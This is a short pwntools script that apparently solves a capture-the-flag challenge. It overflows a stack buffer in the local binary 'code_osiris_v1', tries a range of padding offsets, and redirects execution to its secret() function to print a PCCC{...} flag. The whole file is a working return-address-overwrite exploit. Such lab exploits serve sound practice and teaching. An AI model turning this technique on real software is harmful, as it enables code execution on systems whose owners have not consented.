#!/usr/bin/env python3
from pwn import *
import re

context.arch = "amd64"
context.log_level = "info"

FLAG_RE = re.compile(rb"PCCC\{[^}\r\n]{1,200}\}")

def find_flag(data: bytes) -> bytes | None:
    m = FLAG_RE.search(data)
    return m.group(0) if m else None

def main():
    elf = ELF("./code_osiris_v1", checksec=False)
    secret = elf.symbols.get("secret")
    if secret is None:
        raise SystemExit("Could not find symbol: secret")

    log.info(f"secret() @ {hex(secret)}")

    # buf[64] + saved RBP (8) usually => 72, but compilers can pad.
    # Try aligned first, then bytewise around typical area.
    candidates = list(range(56, 121, 8)) + list(range(56, 181))

    for off in candidates:
        payload = b"A" * off + p64(secret)

        io = process(elf.path)
        # v1 prompts; not required to wait precisely.
        io.sendline(payload)
        out = io.recvall(timeout=1.5) or b""

        flag = find_flag(out)
        if flag:
            log.success(f"Found flag at offset={off}: {flag.decode(errors='replace')}")
            print(flag.decode(errors="replace"))
            return

    raise SystemExit("Failed to recover TOKEN1 (expand search window)")

if __name__ == "__main__":
    main()
